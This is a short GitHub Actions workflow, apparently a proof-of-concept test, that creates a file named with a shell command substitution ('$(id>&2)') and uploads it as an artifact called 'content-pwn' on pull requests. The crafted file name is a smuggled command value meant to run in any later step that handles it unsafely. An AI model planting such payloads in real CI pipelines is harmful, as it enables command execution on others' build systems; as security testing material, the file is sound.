name: ADI Test

on:
  pull_request:

jobs:
  craft:
    runs-on: ubuntu-latest
    steps:
      - name: craft payload artifact
        run: |
          mkdir -p payload
          printf 'pwn\n' > 'payload/$(id>&2).txt'
          ls -la payload
      - uses: actions/upload-artifact@v4
        with:
          name: content-pwn
          path: payload
